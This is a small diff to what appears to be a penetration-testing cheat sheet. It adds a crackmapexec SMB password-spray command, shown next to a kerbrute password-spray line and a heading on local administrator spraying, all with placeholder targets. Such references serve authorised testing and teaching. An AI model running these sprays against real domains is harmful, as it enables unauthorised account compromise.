@@ -1692,6 +1692,7 @@ $ kerbrute passwordspray -d <Domain Name> --dc <DC IP address> names.txt <passwo
 
 ```
 $ sudo crackmapexec smb <IP address> -u names.txt -p <password> | grep +
+$ sudo crackmapexec smb <IP address> -u names.txt -p <password> --continue-on-success | grep +
 ```
 
 - Crackmapexec Local Administrator Password Spray
